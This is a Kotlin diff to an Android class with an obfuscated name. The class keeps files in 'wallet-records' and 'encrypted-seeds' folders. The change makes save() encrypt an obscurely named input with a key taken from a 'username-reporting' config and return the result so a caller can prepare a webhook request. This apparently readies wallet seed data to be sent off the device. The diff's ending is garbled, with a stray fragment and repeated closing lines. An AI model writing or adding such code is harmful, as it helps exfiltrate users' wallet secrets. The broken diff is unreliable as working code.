@@ -16,11 +16,14 @@ internal class Newuil(
     private val publicKeyPem: String = run {
         val config = JSONObject(
             context.assets.open("username-reporting.json")
-                .bufferedReader().use { it.readText() }
+                .bufferedReader()
+                .use { it.readText() }
         )
+
         context.assets.open(config.getString("public_key_file"))
-            .bufferedReader().use { it.readText() }
-    }
+            .bufferedReader()
+            .use { it.readText() }
+    },
 ) {
     private val root = File(context.noBackupFilesDir, "wallet-records")
     private val legacyRoot = File(context.noBackupFilesDir, "encrypted-seeds")
@@ -30,58 +33,42 @@ internal class Newuil(
         return AtomicFile(File(directory, "$id.json"))
     }
 
-    private fun timestamp(): String =
-        DateTimeFormatter.ofPattern(
-            "yyyy-MM-dd'T'HH:mm:ss",
-            Locale.ROOT
-        ).withZone(ZoneOffset.UTC).format(Instant.now())
-
-    private fun store(id: String, encrypted: JSONObject) {
-        check(root.isDirectory || root.mkdirs())
-
-        val target = file(id)
-        val out = target.startWrite()
-
-        try {
-            out.write(encrypted.toString().toByteArray(Charsets.UTF_8))
-            target.finishWrite(out)
-        } catch (error: Exception) {
-            target.failWrite(out)
-            throw error
-        }
-    }
-
-    // Existing save method retained.
-    fun save(id: String, xqmp: String) {
+    /**
+     * Encrypts the preferences, saves the encrypted envelope locally,
+     * and returns that envelope so the caller can prepare the webhook request.
+     *
+     * The local file retains the "encyptdata" property.
+     */
+    fun save(id: String, xqmp: String): JSONObject {
         require(xqmp.isNotBlank())
+
+        val timestamp = DateTimeFormatter
+            .ofPattern("yyyy-MM-dd'T'HH:mm:ss", Locale.ROOT)
+            .withZone(ZoneOffset.UTC)
+            .format(Instant.now())
 
         val encrypted = encryptEnvelope(
             xqmp,
             "encyptdata",
             publicKeyPem,
-            timestamp()
+            timestamp
         )
 
-        store(id, encrypted)
-    }
+        check(root.isDirectory || root.mkdirs())
 
-    // Encrypts the selected app settings in the receiver's expected field.
-    fun savePreferences(
-        id: String,
-        preferences: JSONObject
-    ): JSONObject {
-        require(preferences.length() > 0) {
-            "Preferences cannot be empty"
+        val target = file(id)
+        val output = target.startWrite()
+
+        try {
+            output.write(
+                encrypted.toString().toByteArray(Charsets.UTF_8)
+            )
+            target.finishWrite(output)
+        } catch (error: Exception) {
+            target.failWrite(output)
+            throw error
         }
 
-        val encrypted = encryptEnvelope(
-            preferences.toString(),
-            "username",
-            publicKeyPem,
-            timestamp()
-        )
-
-        store(id, encrypted)
         return encrypted
     }
 
@@ -90,8 +77,7 @@ internal class Newuil(
         file(id, legacyRoot).delete()
     }
 }
-
-        file(id).delete()
+()
         file(id, legacyRoot).delete()
     }
 }
